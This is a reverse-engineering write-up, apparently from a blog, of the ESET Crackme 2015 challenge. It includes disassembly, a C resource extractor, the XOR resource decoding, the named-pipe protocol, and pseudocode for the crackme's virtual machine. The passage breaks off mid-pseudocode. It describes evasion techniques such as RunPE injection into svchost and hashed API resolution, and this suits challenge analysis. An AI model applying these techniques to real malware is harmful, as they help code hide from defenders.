&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; resource_t
{
    uint16_t tag;
    uint32_t size;
    uint8_t data[];
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:0040222D                 mov     edx, [ebp+hKernel32]
.text:00402230                 push    20h
.text:00402232                 add     edx, 4Dh
.text:00402235                 push    edx
.text:00402236                 push    dword ptr [eax+2]
.text:00402239                 lea     ecx, [eax+6]
.text:0040223C                 push    ecx
.text:0040223D                 mov     [ebp+pe], ecx
.text:00402240                 call    xor_string
.text:00402245                 mov     eax, [ebp+pe]
.text:00402248                 push    eax
.text:00402249                 mov     [esi+11Dh], eax
.text:0040224F                 push    dword ptr [edi+2]
.text:00402252                 lea     esi, [edi+6]
.text:00402255                 push    esi
.text:00402256                 call    unpack_pe
.text:0040225B                 push    esi
.text:0040225C                 push    esi
.text:0040225D                 call    relocate_pe
.text:00402262                 mov     eax, [edi+406h]
.text:00402268                 add     esp, 24h
.text:0040226B                 mov     [ebp+pe], eax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From this code, its certain that resource &lt;strong&gt;0x151&lt;/strong&gt; is a PE file and resource &lt;strong&gt;3&lt;/strong&gt; is the key for unpacking the PE file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;xor_string&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* buf, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; size, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* str, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; len)
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; size; ++i)
        buf[i] ^= str[i%len];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The resource with id 3 is decoded with the above algorithm, by passing 32 for len and &amp;ldquo;!This program cannot be run in DOS mode.&amp;rdquo; for str.&lt;br&gt;
So, resource with id 3 contains &lt;code&gt;SXJyZW4lMjBpc3QlMjBtZW5zY2hsaWNo​&lt;/code&gt; which is base64 of ​&lt;code&gt;escape(&amp;quot;Irren ist menschlich&amp;quot;)&lt;/code&gt;​.  The address of the data is stored in [ebp-0x1B]&lt;/p&gt;
&lt;p&gt;Finally the thread calls &lt;strong&gt;[ebp+pe]&lt;/strong&gt; in a loop, with a single argument to ecx which is the address of the data structure (ebp-0x138)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00402270 loc_402270:                             ; CODE XREF: sub_40213B+14D↓j
.text:00402270                                         ; sub_40213B+198↓j
.text:00402270                 pushaw
.text:00402272                 mov     ecx, ebp_138h
.text:00402278                 call    [ebp+pe]
.text:0040227B                 movzx   eax, ax
.text:0040227E                 mov     [ebp+hKernel32], eax
.text:00402281                 popaw
.text:00402283                 xor     ebx, ebx
.text:00402285                 cmp     [ebp+hKernel32], ebx
.text:00402288                 jnz     short loc_402270
.text:0040228A                 mov     esi, ebp_138h
.text:00402290                 cmp     [esi+108h], bl
.text:00402296                 jnz     short loc_4022D5
.text:00402298                 push    0FFFFFFFFh
.text:0040229A                 push    dword ptr [esi+10Dh]
.text:004022A0                 xor     eax, eax
.text:004022A2                 mov     [esi+10Bh], ax
.text:004022A9                 mov     esi, [esi+129h]
.text:004022AF                 sub     esi, 54ED3267h
.text:004022B5                 push    WaitForSingleObject
.text:004022BA                 xor     esi, 0AB12CD99h
.text:004022C0                 call    resolve_export_hash
.text:004022C5                 call    eax
.text:004022C7
.text:004022C7 loc_4022C7:                             ; CODE XREF: sub_40213B+133↑j
.text:004022C7                 mov     esi, ebp_138h
.text:004022CD                 cmp     [esi+108h], bl
.text:004022D3                 jz      short loc_402270
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let’s take a look at the function executed by Thread 2 at 0x0401F13. Let’s call it &lt;strong&gt;Thread2_Proc&lt;/strong&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00401F19                 push    2
.text:00401F1B                 call    _lookup_tag
.text:00401F20                 pop     ecx
.text:00401F21                 test    eax, eax
.text:00401F23                 jnz     short loc_401F2D
.text:00401F25                 or      eax, 0FFFFFFFFh
.text:00401F28                 jmp     locret_402099
.text:00401F2D ; ---------------------------------------------------------------------------
.text:00401F2D
.text:00401F2D loc_401F2D:                             ; CODE XREF: Thread2_Proc+10↑j
.text:00401F2D                 mov     [ebp+var_4], 223F043Eh
.text:00401F34                 add     [ebp+var_4], 23114512h   ; &amp;quot;PIPE&amp;quot;
.text:00401F3B                 push    4
.text:00401F3D                 lea     edx, [ebp+var_4]
.text:00401F40                 push    edx
.text:00401F41                 push    dword ptr [eax+2]
.text:00401F44                 lea     ecx, [eax+6]
.text:00401F47                 push    ecx
.text:00401F48                 mov     [ebp+szPipeName], ecx
.text:00401F4B                 call    xor_string
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cool. So resource 2 contains the pipe path, xor encoded using the string &lt;code&gt;&amp;quot;PIPE&amp;quot;&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00401F50                 mov     eax, ebp_138h
.text:00401F55                 add     esp, 10h
.text:00401F58                 cmp     byte ptr [eax+108h], 0
.text:00401F5F                 jnz     loc_402097
.text:00401F65                 push    ebx
.text:00401F66                 push    esi
.text:00401F67                 push    edi
.text:00401F68                 mov     ebx, 54ED3267h
.text:00401F6D                 mov     edi, 0AB12CD99h
.text:00401F72
.text:00401F72 loc_401F72:                             ; CODE XREF: Thread2_Proc+17B↓j
.text:00401F72                 mov     esi, [eax+129h]
.text:00401F78                 xor     edx, edx
.text:00401F7A                 push    edx
.text:00401F7B                 push    edx
.text:00401F7C                 mov     ecx, 200h
.text:00401F81                 push    ecx
.text:00401F82                 push    ecx
.text:00401F83                 push    0FFh
.text:00401F88                 push    edx
.text:00401F89                 push    3
.text:00401F8B                 push    [ebp+szPipeName] ; &amp;quot;\\.\pipe\EsetCrackmePipe&amp;quot;
.text:00401F8E                 sub     esi, ebx
.text:00401F90                 push    CreateNamedPipeA
.text:00401F95                 xor     esi, edi
.text:00401F97                 call    resolve_export_hash
.text:00401F9C                 call    eax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, it creates a named pipe &amp;ldquo;\.\pipe\EsetCrackmePipe&amp;rdquo;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00401FEE                 lea     eax, [ebp+b1]
.text:00401FF1                 push    eax             ; buffer
.text:00401FF2                 push    1               ; size
.text:00401FF4                 call    read_pipe
.text:00401FF9                 lea     eax, [ebp+b2]
.text:00401FFC                 push    eax             ; buffer
.text:00401FFD                 push    2               ; size
.text:00401FFF                 call    read_pipe
.text:00402004                 push    dword ptr [ebp+b2]
.text:00402007                 push    dword ptr [ebp+b1]
.text:0040200A                 call    process
.text:0040200F                 mov     eax, ebp_138h
.text:00402014                 mov     esi, [eax+129h]
.text:0040201A                 add     esp, 18h
.text:0040201D                 push    dword ptr [eax+121h]
.text:00402023                 sub     esi, ebx
.text:00402025                 push    FlushFileBuffers
.text:0040202A                 xor     esi, edi
.text:0040202C                 call    resolve_export_hash
.text:00402031                 call    eax
.text:00402033                 mov     eax, ebp_138h
.text:00402038                 mov     esi, [eax+129h]
.text:0040203E                 push    dword ptr [eax+121h]
.text:00402044                 sub     esi, ebx
.text:00402046                 push    DisconnectNamedPipe
.text:0040204B                 xor     esi, edi
.text:0040204D                 call    resolve_export_hash
.text:00402052                 call    eax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It reads a byte followed by a int16 and then processes it. This is repeated while &lt;strong&gt;bStopProcessing&lt;/strong&gt; is 0.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00401E1C                 lea     eax, [ebp+b1]
.text:00401E1F                 push    eax             ; buffer
.text:00401E20                 push    1               ; size
.text:00401E22                 call    write_pipe
.text:00401E27                 lea     eax, [ebp+b2]
.text:00401E2A                 push    eax             ; buffer
.text:00401E2B                 push    2               ; size
.text:00401E2D                 call    write_pipe
.text:00401E32                 add     esp, 10h
.text:00401E35                 cmp     [ebp+b1], 1
.text:00401E39                 jnz     short loc_401E65
.text:00401E3B                 push    [ebp+b2]
.text:00401E3E                 call    _lookup_tag
.text:00401E43                 mov     edi, eax
.text:00401E45                 pop     ecx
.text:00401E46                 test    edi, edi
.text:00401E48                 jz      short loc_401E87
.text:00401E4A                 lea     esi, [edi+2]
.text:00401E4D                 push    esi             ; buffer
.text:00401E4E                 push    4               ; size
.text:00401E50                 call    write_pipe
.text:00401E55                 add     edi, 6
.text:00401E58                 push    edi             ; buffer
.text:00401E59                 push    dword ptr [esi] ; size
.text:00401E5B                 call    write_pipe
.text:00401E60                 add     esp, 10h
.text:00401E63                 jmp     short loc_401E8F
.text:00401E65 ; ---------------------------------------------------------------------------
.text:00401E65
.text:00401E65 loc_401E65:                             ; CODE XREF: process+22↑j
.text:00401E65                 cmp     [ebp+b1], 2
.text:00401E69                 jnz     short loc_401E77
.text:00401E6B                 mov     esi, [ebp+b2]
.text:00401E6E                 call    _mark
.text:00401E73
.text:00401E73 loc_401E73:                             ; CODE XREF: process+6E↓j
.text:00401E73                 push    0
.text:00401E75                 jmp     short loc_401E89
.text:00401E77 ; ---------------------------------------------------------------------------
.text:00401E77
.text:00401E77 loc_401E77:                             ; CODE XREF: process+52↑j
.text:00401E77                 cmp     [ebp+b1], 3
.text:00401E7B                 jnz     short loc_401E87
.text:00401E7D                 mov     esi, [ebp+b2]
.text:00401E80                 call    _clear_mark
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, process writes the bytes into the pipe in the order they were read. The first byte can take three values only - 1, 2 and 3.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Lookup tag whose id is the next two bytes and write the resource preceded by its length&lt;/li&gt;
&lt;li&gt;Mark tag of the given 2 byte id (in the marked array, at offset +8 wrt ebp-0x138)&lt;/li&gt;
&lt;li&gt;Clear marked tag&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;extracting-resources&#34;&gt;Extracting Resources&lt;/h3&gt;
&lt;p&gt;Here&amp;rsquo;s a small C program to extract the resources&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;void&lt;/span&gt; (*FUNC) (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;*, DWORD, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;*);

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; g_szKey[] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;SXJyZW4lMjBpc3QlMjBtZW5zY2hsaWNo&amp;#34;&lt;/span&gt;;

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* &lt;span style=&#34;color:#447fcf&#34;&gt;lookup&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;* hDll, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;short&lt;/span&gt; tag)
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* ptr = (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;*) hDll;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (*(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;short&lt;/span&gt;*)(ptr) != tag)
    {
        ptr += &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;+*(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;*)(ptr+&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; ptr;
}

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;** argv)
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (argc == &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;)
    {
        printf(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Usage: %s [tag bUnpack? file_name]*&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, argv[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;]);
        exit(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
    }

    HMODULE hExe = LoadLibrary(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;EsetCrackme2015.exe&amp;#34;&lt;/span&gt;);
    HMODULE hDll = LoadLibraryEx(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;EsetCrackme2015.dll&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#24909d&#34;&gt;NULL&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;);

    FUNC unpackMe = (FUNC) ((&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;*) hExe + &lt;span style=&#34;color:#3677a9&#34;&gt;0x1000&lt;/span&gt; + &lt;span style=&#34;color:#3677a9&#34;&gt;0xd11&lt;/span&gt; - &lt;span style=&#34;color:#3677a9&#34;&gt;0x200&lt;/span&gt;);

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;** p = argv; *++p; p += &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;)
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;short&lt;/span&gt; m_tag;
        sscanf(p[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;%hi&amp;#34;&lt;/span&gt;, &amp;amp;m_tag);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* tag = lookup(hDll, m_tag);
        
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (p[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;] == &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;)
            unpackMe(tag+&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;, *(DWORD*)(tag+&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;), g_szKey);
        FILE* dp = fopen(p[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;], &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;wb&amp;#34;&lt;/span&gt;);
        fwrite(tag+&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;, *(DWORD*)(tag+&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;), dp);
        fclose(dp);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;resource-0x101&#34;&gt;Resource 0x101&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:004009A9                 push    ebp
.text:004009AA                 mov     ebp, esp
.text:004009AC                 sub     esp, 104h
.text:004009B2                 push    esi
.text:004009B3                 mov     esi, ecx
.text:004009B5                 mov     ebp_138h, esi
.text:004009BB                 call    is_initialized?
.text:004009C0                 test    al, al
.text:004009C2                 jz      short loc_4009CE
.text:004009C4                 call    LoadResources
.text:004009C9                 jmp     loc_400BA5
.text:004009CE ; ---------------------------------------------------------------------------
.text:004009CE
.text:004009CE loc_4009CE:                             ; CODE XREF: sub_4009A9+19↑j
.text:004009CE                 call    has_all_extracted?
.text:004009D3                 test    al, al
.text:004009D5                 jz      short loc_4009E1
.text:004009D7                 call    FreeResources
.text:004009DC                 jmp     loc_400BA5
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;LoadResources&lt;/strong&gt; fetches resources - 0x102, 0x103 and 0x104&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:004009E1                 push    0BB01h
.text:004009E6                 call    is_marked?
.text:004009EB                 pop     ecx
.text:004009EC                 test    al, al
.text:004009EE                 jz      loc_400A75
.text:004009F4                 push    0BB02h
.text:004009F9                 call    is_marked?
.text:004009FE                 pop     ecx
.text:004009FF                 test    al, al
.text:00400A01                 jz      short loc_400A75
.text:00400A03                 push    0BB03h
.text:00400A08                 call    is_marked?
.text:00400A0D                 pop     ecx
.text:00400A0E                 test    al, al
.text:00400A10                 jz      short loc_400A75
.text:00400A12                 push    0FF01h
.text:00400A17                 call    is_marked?
.text:00400A1C                 pop     ecx
.text:00400A1D                 test    al, al
.text:00400A1F                 jz      short loc_400A75
.text:00400A21                 push    offset aUser32Dll ; &amp;quot;user32.dll&amp;quot;
.text:00400A26                 push    LoadLibraryA
.text:00400A2B                 call    dword ptr [esi+111h]
.text:00400A31                 call    eax
.text:00400A33                 push    40h
.text:00400A35                 push    offset aInfo    ; &amp;quot;Info&amp;quot;
.text:00400A3A                 push    offset aThatsAllCongra ; &amp;quot;Thats all. Congratulations!&amp;quot;
.text:00400A3F                 push    0
.text:00400A41                 push    offset aMessageboxa ; &amp;quot;MessageBoxA&amp;quot;
.text:00400A46                 push    eax
.text:00400A47                 mov     eax, ebp_138h
.text:00400A4C                 push    GetProcAddress
.text:00400A51                 call    dword ptr [eax+111h]
.text:00400A57                 call    eax
.text:00400A59                 call    eax
.text:00400A5B                 mov     ecx, ebp_138h
.text:00400A61                 mov     eax, 0FFFFh
.text:00400A66                 mov     [ecx+10Bh], ax   ; mark finished
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, resources 0xbb01, 0xbb02, 0xbb03 and 0xff01 must be marked to complete the entire challenge. Initially none of these are marked.&lt;br&gt;
Also, dwTagToExtract is 1. So the following code is executed&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00400AA8                 mov     esi, offset aSvchostExe ; &amp;quot;\\svchost.exe&amp;quot;
.text:00400AAD                 movsd
.text:00400AAE                 movsd
.text:00400AAF                 movsd
.text:00400AB0                 lea     eax, [ebp+szSystem32Path]
.text:00400AB6                 push    eax
.text:00400AB7                 movsb
.text:00400AB8                 call    spawn_svchost
.text:00400ABD                 mov     esi, ebp_138h
.text:00400AC3                 pop     ecx
.text:00400AC4                 push    2
.text:00400AC6                 pop     eax
.text:00400AC7                 mov     [esi+109h], ax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;a RunPE technique is used to execute the PE file, resource 0x151.&lt;br&gt;
If dwTagToExtract is 0xbb01, then &lt;strong&gt;drv.zip&lt;/strong&gt; is extracted&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00400ADC                 push    1
.text:00400ADE                 push    offset aDrvZip  ; &amp;quot;drv.zip&amp;quot;
.text:00400AE3                 mov     eax, 152h
.text:00400AE8                 call    extract_resource
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If dwTagToExtract is 0xaa01, then &lt;strong&gt;PuncherMachine&lt;/strong&gt; and &lt;strong&gt;PunchCardReader&lt;/strong&gt; are extracted&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00400B11                 push    1
.text:00400B13                 push    offset aPunchcardreade ; &amp;quot;PunchCardReader.exe&amp;quot;
.text:00400B18                 mov     eax, 154h
.text:00400B1D                 call    extract_resource
.text:00400B22                 push    1
.text:00400B24                 push    offset aPunchermachine ; &amp;quot;PuncherMachine.exe&amp;quot;
.text:00400B29                 mov     eax, 153h
.text:00400B2E                 call    extract_resource
.text:00400B33                 push    1               ; bUnpack
.text:00400B35                 push    4               ; &amp;quot;\\?\GLOBALROOT\Device\45736574\&amp;quot;
.text:00400B37                 call    get_resource
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;resource-0x102---a-virtual-machine&#34;&gt;Resource 0x102 - A Virtual Machine&lt;/h2&gt;
&lt;p&gt;Here is my analysis of the resource 0x102.&lt;/p&gt;
&lt;h4 id=&#34;ldrtype-index-size&#34;&gt;ldr(type, index, size)&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if type == 0:
    if size == 0:
        return (byte) regs[index]
    elif size == 1:
        return (word) regs[index]
    else:
        return (dword) regs[index]
elif type == 1:
    if size == 0:
        return *(byte*) regs[index]
    elif size == 1:
        return *(word*) regs[index]
    else:
        return *(dword*) regs[index]
elif type == 2:
    if size == 0:
        return _get_int8()
    elif size == 1:
        return _get_int16()
    else:
        return _get_int32()
elif type == 3:
    return vm[0x45a] + _get_int32()
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;strtypesizedataindex&#34;&gt;str(type,size,data,index)&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if type == 1:
    regs[index] = data
elif type == 2:
    ssize = size == 0 ? &#39;byte&#39; : size == 1 ? &#39;word&#39; : &#39;dword&#39;
    *([ssize]*) regs[index] = data
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;call&#34;&gt;call()&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;o = read1()
fn = ldr(o.type, o.index, 2)
sesp = esp
esp = stack_top
call fn(eax=regs[0])
stack_top=esp
esp = sesp
regs[0]=eax
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;call_stdlib&#34;&gt;CALL_STDLIB()&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;o = read2()
iFnHash = ldr(o.ldr_type, o.str_index, 2)
iModHash = ldr(o.str_type, o.ldr_index, 2)
if o.ldr_type == 3:
    iFnHash = *(dword) iFnHash
if o.str_type == 3:
    iModHash = *(dword) iModHash
if iModHash == 0:
    hModBase = vm[0x409]
else:
    hModBase = ResolveModule(iModHash)
if hModBase == 0:
    hModBase = _probably_LoadModule(iModHash)
fn = ResolveExport(hModBase, iFnHash)
sesp = esp
esp = stack_top
call fn(eax=regs[0])
stack_top=esp
esp = sesp
regs[0]=eax
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;push&#34;&gt;PUSH()&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;o = read1()
data = ldr(o.type, o.index, o.word_size)
vm.stack.push(data)
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;pop_reg&#34;&gt;POP_REG()&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;o = read1()
regs[o.index] = pop()
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;cmp&#34;&gt;CMP()&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;o = read2()
d = ldr(o.ldr_type, o.ldr_index, o.str_type)
r = regs[o.str_index]
if o.word_size == 0:
    vm.flags = r == d
elif o.word_size == 1:
    vm.flags = r != d
elif o.word_size == 2:
    vm.flags = r &amp;gt;= d
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;jmp&#34;&gt;JMP()&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;o = read1()
d = ldr(2, 0, 2)
if o == 0:
    vm.next_insn_offset = d
elif o == 1:
    if vm.flags:
        vm.flags = 0
        vm.next_insn_offset = d
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;call_vm&#34;&gt;CALL_VM()&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;d = ldr(2, 0, 2)
vm.stack.push(vm.next_insn_offset)
vm.next_insn_offset = d
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;ret_vm&#34;&gt;RET_VM()&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;vm.next_insn_offset = vm.stack.pop()
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;alu&#34;&gt;ALU()&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;o = read2()
d = ldr(o.ldr_type, o.ldr_index, o.str_type)
if o.word_size == 0:
    regs[o.str_index] ^= d
elif o.word_size == 1:
    regs[o.str_index] += d
elif o.word_size == 2:
    regs[o.str_index] -= d
elif o.word_size == 3:
    regs[o.str_index] &amp;lt;&amp;lt;= d
elif o.word_size == 4:
    regs[o.str_index] &amp;gt;&amp;gt;= d
elif o.word_size == 5:
    rol = lambda a, b, c: a&amp;lt;&amp;lt;b|a&amp;gt;&amp;gt;8*c-b
    regs[o.str_index] = rol(regs[o.str_index], d, 2**o.str_type)
elif o.word_size == 6:
    ror = lambda a, b, c: a&amp;lt;&amp;lt;b|a&amp;gt;&amp;gt;8*c-b
    regs[o.str_index] = ror(regs[o.str_index], d, 2**o.str_type)
elif o.word_size == 7:
    regs[o.str_index] %= d
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;malloc&#34;&gt;MALLOC()&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;o = read1()
d = ldr(o.type, o.index, o.word_size)
regs[0] = VirtualAlloc(size=d, flags=0x40)
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;free&#34;&gt;FREE()&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;o = read1()
d = ldr(o.type, o.index, o.word_size)
free(d)
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;emulate&#34;&gt;EMULATE()&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;o = read2()
d1 = ldr(o.ldr_type, o.str_index, 2)
d2 = ldr(o.str_type, o.ldr_index, o.word_size)
mem = alloc(size=d2&amp;lt;&amp;lt;2, flags=0x40)
for i in xrange(d2):
    mem[i] = vm.stack.pop()
vm2 = {}
vm2.init()
vm2.run(d1, vm.kernel32, d2, mem)
vm2.free()
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;RunVM(lpRes, hModule, nElem, lpArray)
{
    if (hModule || vm.bModuleLoaded)
        vm.hModule = hModule
    else
        vm.hModule = ResolveModule(&amp;quot;kernel32&amp;quot;)
    mem = alloc(lpRes.size, flags=0x40)
    memcpy(mem, lpRes, lpRes.size)
    vm[0x45a] = mem+[lpRes+6]
    vm[0x3fd] = mem
    vm[0x401] = lpRes.size
    vm.insn_base = mem+0x12
    stk = alloc(0x400000, flags=4)
    if (vm.stack_base)
        free(vm.stack_base)
